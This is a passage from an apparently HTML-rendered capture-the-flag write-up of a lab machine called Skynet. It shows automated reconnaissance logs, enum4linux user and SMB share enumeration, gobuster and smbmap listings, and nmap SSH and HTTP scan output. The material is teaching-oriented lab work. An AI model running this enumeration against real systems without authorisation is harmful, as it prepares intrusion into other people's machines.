<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/139/nmap-smb on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/139/sslscan on 10.10.128.90 finished successfully in less than a second
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/139/enum4linux on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/80/wkhtmltoimage on 10.10.128.90 finished successfully in <span style="color:#ae81ff">3</span> seconds
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/139/smbclient on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/110/nmap-pop3 on 10.10.128.90 finished successfully in <span style="color:#ae81ff">4</span> seconds
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/139/smbmap-share-permissions on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/139/smbclient on 10.10.128.90 finished successfully in <span style="color:#ae81ff">4</span> seconds
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/139/smbmap-list-contents on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/80/whatweb on 10.10.128.90 finished successfully in <span style="color:#ae81ff">8</span> seconds
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/139/smbmap-execute-command on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/22/nmap-ssh on 10.10.128.90 finished successfully in <span style="color:#ae81ff">11</span> seconds
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/143/sslscan on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/143/sslscan on 10.10.128.90 finished successfully in less than a second
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/143/nmap-imap on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/143/nmap-imap on 10.10.128.90 finished successfully in <span style="color:#ae81ff">5</span> seconds
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/445/sslscan on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/445/sslscan on 10.10.128.90 finished successfully in less than a second
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/445/nmap-smb on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/139/smbmap-execute-command on 10.10.128.90 finished successfully in <span style="color:#ae81ff">9</span> seconds
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/445/smbmap-share-permissions on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/139/smbmap-share-permissions on 10.10.128.90 finished successfully in <span style="color:#ae81ff">28</span> seconds
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/445/smbmap-list-contents on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:28:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">10</span> tasks still running on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/445/smbmap-share-permissions on 10.10.128.90 finished successfully in <span style="color:#ae81ff">26</span> seconds
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running task tcp/445/smbmap-execute-command on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/445/smbmap-execute-command on 10.10.128.90 finished successfully in <span style="color:#ae81ff">7</span> seconds
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/139/smbmap-list-contents on 10.10.128.90 finished successfully in <span style="color:#ae81ff">49</span> seconds
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/445/smbmap-list-contents on 10.10.128.90 finished successfully in <span style="color:#ae81ff">1</span> minute, less than a second
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:29:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">7</span> tasks still running on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/139/enum4linux on 10.10.128.90 finished successfully in <span style="color:#ae81ff">2</span> minutes, <span style="color:#ae81ff">22</span> seconds
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:30:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">6</span> tasks still running on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/80/nmap-http on 10.10.128.90 finished successfully in <span style="color:#ae81ff">2</span> minutes, <span style="color:#ae81ff">53</span> seconds
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:31:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">5</span> tasks still running on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:32:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">5</span> tasks still running on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/139/nmap-smb on 10.10.128.90 finished successfully in <span style="color:#ae81ff">5</span> minutes, less than a second
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:33:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">4</span> tasks still running on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/445/nmap-smb on 10.10.128.90 finished successfully in <span style="color:#ae81ff">5</span> minutes, <span style="color:#ae81ff">51</span> seconds
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:34:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">3</span> tasks still running on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:35:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">3</span> tasks still running on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:36:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">3</span> tasks still running on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:37:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">3</span> tasks still running on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:38:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">3</span> tasks still running on 10.10.128.90
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Task tcp/80/nikto on 10.10.128.90 finished successfully in <span style="color:#ae81ff">11</span> minutes, <span style="color:#ae81ff">20</span> seconds
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:39:19<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">2</span> tasks still running on 10.10.128.90

</code></pre></div><p>Ìf we review enum4linux results we see a username <strong>milesdyson</strong></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> <span style="color:#f92672">=============================</span> 
|    Users on 10.10.128.90    |
 <span style="color:#f92672">=============================</span> 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson	Name: 	Desc: 

user:<span style="color:#f92672">[</span>milesdyson<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x3e8<span style="color:#f92672">]</span>
	User Name   :	milesdyson
	Full Name   :	
	Home Drive  :	<span style="color:#ae81ff">\\</span>skynet<span style="color:#ae81ff">\m</span>ilesdyson
	Dir Drive   :	
	Profile Path:	<span style="color:#ae81ff">\\</span>skynet<span style="color:#ae81ff">\m</span>ilesdyson<span style="color:#ae81ff">\p</span>rofile
</code></pre></div><p>We also get some SMB shares:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> <span style="color:#f92672">=========================================</span> 
|    Share Enumeration on 10.10.128.90    |
 <span style="color:#f92672">=========================================</span> 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      Skynet Anonymous Share
	milesdyson      Disk      Miles Dyson Personal Share
	IPC$            IPC       IPC Service <span style="color:#f92672">(</span>skynet server <span style="color:#f92672">(</span>Samba, Ubuntu<span style="color:#f92672">))</span>
SMB1 disabled -- no workgroup available

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Attempting to map shares on 10.10.128.90
//10.10.128.90/print$	Mapping: DENIED, Listing: N/A
//10.10.128.90/anonymous	Mapping: OK, Listing: OK
//10.10.128.90/milesdyson	Mapping: DENIED, Listing: N/A
//10.10.128.90/IPC$	<span style="color:#f92672">[</span>E<span style="color:#f92672">]</span> Can<span style="color:#960050;background-color:#1e0010">&#39;</span>t understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing <span style="color:#ae81ff">\*</span>

</code></pre></div><p>Let&rsquo;s see to what gobuster found:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/.hta <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
/.hta.asp <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
/.hta.aspx <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
/.hta.jsp <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
/.hta.txt <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
/.hta.html <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
/.hta.php <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
/.htaccess <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
/.htaccess.asp <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
/.htaccess.aspx <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
/.htaccess.jsp <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
/.htaccess.txt <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
/.htaccess.html <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
/.htaccess.php <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
/.htpasswd <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
/.htpasswd.txt <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
/.htpasswd.html <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
/.htpasswd.php <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
/.htpasswd.asp <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
/.htpasswd.aspx <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
/.htpasswd.jsp <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
/config <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 313<span style="color:#f92672">]</span>
</code></pre></div><p>We also got some SMBMap results back with some files on the shares:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Working on it...
                                
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	anonymous                                         	READ ONLY	Skynet Anonymous Share
	.<span style="color:#ae81ff">\a</span>nonymous<span style="color:#ae81ff">\*</span>
	dr--r--r--                <span style="color:#ae81ff">0</span> Wed Sep <span style="color:#ae81ff">18</span> 00:41:20 2019	.
	dr--r--r--                <span style="color:#ae81ff">0</span> Tue Sep <span style="color:#ae81ff">17</span> 03:20:17 2019	..
	fr--r--r--              <span style="color:#ae81ff">163</span> Tue Sep <span style="color:#ae81ff">17</span> 23:04:59 2019	attention.txt
	dr--r--r--                <span style="color:#ae81ff">0</span> Wed Sep <span style="color:#ae81ff">18</span> 00:42:16 2019	logs
	dr--r--r--                <span style="color:#ae81ff">0</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:06 2019	books
	.<span style="color:#ae81ff">\a</span>nonymous<span style="color:#ae81ff">\l</span>ogs<span style="color:#ae81ff">\*</span>
	dr--r--r--                <span style="color:#ae81ff">0</span> Wed Sep <span style="color:#ae81ff">18</span> 00:42:16 2019	.
	dr--r--r--                <span style="color:#ae81ff">0</span> Wed Sep <span style="color:#ae81ff">18</span> 00:41:20 2019	..
	fr--r--r--                <span style="color:#ae81ff">0</span> Wed Sep <span style="color:#ae81ff">18</span> 00:42:13 2019	log2.txt
	fr--r--r--              <span style="color:#ae81ff">471</span> Wed Sep <span style="color:#ae81ff">18</span> 00:41:59 2019	log1.txt
	fr--r--r--                <span style="color:#ae81ff">0</span> Wed Sep <span style="color:#ae81ff">18</span> 00:42:16 2019	log3.txt
	.<span style="color:#ae81ff">\a</span>nonymous<span style="color:#ae81ff">\b</span>ooks<span style="color:#ae81ff">\*</span>
	dr--r--r--                <span style="color:#ae81ff">0</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:06 2019	.
	dr--r--r--                <span style="color:#ae81ff">0</span> Wed Sep <span style="color:#ae81ff">18</span> 00:41:20 2019	..
	fr--r--r--         <span style="color:#ae81ff">33153722</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Introduction to Machine Learning with Python.pdf
	fr--r--r--          <span style="color:#ae81ff">4222827</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:06 2019	What You Need to Know about Machine Learning.pdf
	fr--r--r--          <span style="color:#ae81ff">4986980</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:06 2019	Thoughtful Machine Learning with Python.mobi
	fr--r--r--         <span style="color:#ae81ff">16433984</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Python Machine Learning.pdf
	fr--r--r--         <span style="color:#ae81ff">11527855</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Reinforcement Learning - With Open AI, TensorFlow and Keras Using Python.pdf
	fr--r--r--          <span style="color:#ae81ff">2219430</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Machine Learning Using C# Succinctly.pdf
	fr--r--r--         <span style="color:#ae81ff">14637798</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Python Real World Machine Learning.epub
	fr--r--r--          <span style="color:#ae81ff">1961798</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Neural Networks Using C# Succinctly.pdf
	fr--r--r--          <span style="color:#ae81ff">4900975</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Quantum Machine Learning - Peter Wittek.epub
	fr--r--r--           <span style="color:#ae81ff">230243</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Introduction To Python Programming - Beginner<span style="color:#960050;background-color:#1e0010">&#39;</span>s Guide To Computer Programming And Machine Learning.epub
	fr--r--r--          <span style="color:#ae81ff">4561261</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Large Scale Machine Learning with Python.pdf
	fr--r--r--         <span style="color:#ae81ff">10067139</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Mastering Machine Learning with Python in Six Steps.pdf
	fr--r--r--          <span style="color:#ae81ff">3816111</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Big Data, Data Mining, and Machine Learning.epub
	fr--r--r--          <span style="color:#ae81ff">8336682</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Python Machine Learning Case Studies.pdf
	fr--r--r--         <span style="color:#ae81ff">12445322</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Practical Machine Learning.pdf
	fr--r--r--         <span style="color:#ae81ff">39999962</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Python Machine Learning Blueprints.pdf
	fr--r--r--          <span style="color:#ae81ff">7734865</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Machine Learning - Hands-On <span style="color:#66d9ef">for</span> Developers and Technical Professionals.pdf
	fr--r--r--         <span style="color:#ae81ff">25159026</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Machine Learning <span style="color:#66d9ef">for</span> Developers.pdf
	fr--r--r--          <span style="color:#ae81ff">7483357</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Python <span style="color:#66d9ef">for</span> Probability, Statistics, and Machine Learning.pdf
	fr--r--r--          <span style="color:#ae81ff">2976969</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	A Course in Machine Learning.pdf
	fr--r--r--          <span style="color:#ae81ff">6084041</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Neural Network Programming with Java.pdf
	fr--r--r--          <span style="color:#ae81ff">2192094</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Designing Machine Learning Systems with Python.pdf
	fr--r--r--          <span style="color:#ae81ff">9548256</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Mastering .NET Machine Learning.epub
	fr--r--r--          <span style="color:#ae81ff">8059599</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Learning Generative Adversarial Networks.epub
	fr--r--r--          <span style="color:#ae81ff">4038836</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Learning NumPy Array.pdf
	fr--r--r--          <span style="color:#ae81ff">4811954</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Machine Learning with Spark.pdf
	fr--r--r--          <span style="color:#ae81ff">5508789</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Machine Learning in Java.pdf
	fr--r--r--         <span style="color:#ae81ff">13048518</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Machine Learning <span style="color:#66d9ef">for</span> the Web.pdf
	fr--r--r--         <span style="color:#ae81ff">12029934</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Large Scale Machine Learning with Spark.pdf
	fr--r--r--          <span style="color:#ae81ff">6896831</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Machine Learning in Action.pdf
	fr--r--r--          <span style="color:#ae81ff">2632302</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Practical Reinforcement Learning.epub
	fr--r--r--          <span style="color:#ae81ff">6805939</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Building Machine Learning Systems with Python - Second Edition.pdf
	fr--r--r--          <span style="color:#ae81ff">1351294</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Learning scikit-learn - Machine Learning in Python.pdf
	fr--r--r--          <span style="color:#ae81ff">2912524</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Python Machine Learning By Example.epub
	fr--r--r--         <span style="color:#ae81ff">14525480</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:04 2019	Python - Deeper Insights into Machine Learning.pdf
	fr--r--r--         <span style="color:#ae81ff">10401548</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Machine Learning - Jason Bell.epub
	fr--r--r--          <span style="color:#ae81ff">4578898</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Microsoft Azure Machine Learning.pdf
	fr--r--r--         <span style="color:#ae81ff">23284986</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Python Machine Learning Cookbook.pdf
	fr--r--r--          <span style="color:#ae81ff">2242317</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Advanced Machine Learning with Python.pdf
	fr--r--r--          <span style="color:#ae81ff">7245188</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Machine Learning Projects <span style="color:#66d9ef">for</span> .NET Developers.pdf
	fr--r--r--         <span style="color:#ae81ff">16075987</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Real-World Machine Learning.pdf
	fr--r--r--          <span style="color:#ae81ff">7457736</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:06 2019	scikit-learn Cookbook - Second Edition.pdf
	fr--r--r--          <span style="color:#ae81ff">4271512</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Mastering Machine Learning with scikit-learn - Second Edition.epub
	fr--r--r--          <span style="color:#ae81ff">6308460</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Machine Learning <span style="color:#66d9ef">for</span> Email.epub
	fr--r--r--          <span style="color:#ae81ff">8807568</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Thoughtful Machine Learning with Python A Test-Driven Approach.pdf
	fr--r--r--          <span style="color:#ae81ff">1983841</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:06 2019	Using Python to Develop Analytics, Control and Machine Learning Products.pdf
	fr--r--r--          <span style="color:#ae81ff">3558541</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:02 2019	Building Intelligent Systems - A Guide to Machine Learning Engineering.pdf
	fr--r--r--          <span style="color:#ae81ff">1617724</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:06 2019	What You Need to Know about R.pdf
	fr--r--r--          <span style="color:#ae81ff">8908750</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Practical Machine Learning with H2O - Powerful, Scalable Techniques <span style="color:#66d9ef">for</span> Deep Learning and AI.pdf
	fr--r--r--         <span style="color:#ae81ff">14065243</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Machine Learning in Action - 中文版.pdf
	fr--r--r--         <span style="color:#ae81ff">24204134</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:03 2019	Machine Learning <span style="color:#66d9ef">for</span> Hackers.pdf
	fr--r--r--          <span style="color:#ae81ff">6656692</span> Wed Sep <span style="color:#ae81ff">18</span> 00:40:05 2019	Python Machine Learning Cookbook - Early Release.pdf
	milesdyson                                        	NO ACCESS	Miles Dyson Personal Share
	IPC$                                              	NO ACCESS	IPC Service <span style="color:#f92672">(</span>skynet server <span style="color:#f92672">(</span>Samba, Ubuntu<span style="color:#f92672">))</span>
<span style="color:#f92672">[</span><span style="color:#ae81ff">\]</span> Working on it...
</code></pre></div><p>Let&rsquo;s see what ssh nmap scan returned:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Nmap 7.80 scan initiated Mon Aug 24 20:27:47 2020 as: nmap -vv --reason -Pn -sV -p 22 --script=banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -oN /home/kali/results/10.10.128.90/scans/tcp_22_ssh_nmap.txt -oX /home/kali/results/10.10.128.90/scans/xml/tcp_22_ssh_nmap.xml 10.10.128.90</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.128.90
Host is up, received user-set <span style="color:#f92672">(</span>0.36s latency<span style="color:#f92672">)</span>.
Scanned at 2020-08-24 20:27:47 EDT <span style="color:#66d9ef">for</span> 11s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
|_banner: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKeTyrvAfbRB4onlz23fmgH5DPnSz07voOYaVMKPx5bT62zn7eZzecIVvfp5LBCetcOyiw2Yhocs0oO1/RZSqXlwTVzRNKzznG4WTPtkvD7ws/4tv2cAGy1lzRy9b+361HHIXT8GNteq2mU+boz3kdZiiZHIml4oSGhI+/+IuSMl5clB5/FzKJ+mfmu4MRS8iahHlTciFlCpmQvoQFTA5s2PyzDHM6XjDYH1N3Euhk4xz44Xpo1hUZnu+P975/GadIkhr/Y0N5Sev+Kgso241/v0GQ2lKrYz3RPgmNv93AIQ4t3i3P6qDnta/06bfYDSEEJXaON+A9SCpk2YSrj4A7
|   <span style="color:#ae81ff">256</span> 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0UWS0x1ZsOGo510tgfVbNVhdE5LkzA4SWDW/5UjDumVQ7zIyWdstNAm+lkpZ23Iz3t8joaLcfs8nYCpMGa/xk<span style="color:#f92672">=</span>
|   <span style="color:#ae81ff">256</span> 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICHVctcvlD2YZ4mLdmUlSwY8Ro0hCDMKGqZ2+DuI0KFQ
| ssh2-enum-algos: 
|   kex_algorithms: <span style="color:#f92672">(</span>6<span style="color:#f92672">)</span>
|       curve25519-sha256@libssh.org
|       ecdh-sha2-nistp256
|       ecdh-sha2-nistp384
|       ecdh-sha2-nistp521
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group14-sha1
|   server_host_key_algorithms: <span style="color:#f92672">(</span>5<span style="color:#f92672">)</span>
|       ssh-rsa
|       rsa-sha2-512
|       rsa-sha2-256
|       ecdsa-sha2-nistp256
|       ssh-ed25519
|   encryption_algorithms: <span style="color:#f92672">(</span>6<span style="color:#f92672">)</span>
|       chacha20-poly1305@openssh.com
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|       aes128-gcm@openssh.com
|       aes256-gcm@openssh.com
|   mac_algorithms: <span style="color:#f92672">(</span>10<span style="color:#f92672">)</span>
|       umac-64-etm@openssh.com
|       umac-128-etm@openssh.com
|       hmac-sha2-256-etm@openssh.com
|       hmac-sha2-512-etm@openssh.com
|       hmac-sha1-etm@openssh.com
|       umac-64@openssh.com
|       umac-128@openssh.com
|       hmac-sha2-256
|       hmac-sha2-512
|       hmac-sha1
|   compression_algorithms: <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>
|       none
|_      zlib@openssh.com
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#75715e"># Nmap done at Mon Aug 24 20:27:58 2020 -- 1 IP address (1 host up) scanned in 11.46 seconds</span>
</code></pre></div><p>We also get another set of results back from nmap on port 80:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># Nmap 7.80 scan initiated Mon Aug 24 20:27:47 2020 as: nmap -vv --reason -Pn -sV -p 80 &#34;--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)&#34; -oN /home/kali/results/10.10.128.90/scans/tcp_80_http_nmap.txt -oX /home/kali/results/10.10.128.90/scans/xml/tcp_80_http_nmap.xml 10.10.128.90</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.128.90
Host is up, received user-set <span style="color:#f92672">(</span>0.36s latency<span style="color:#f92672">)</span>.
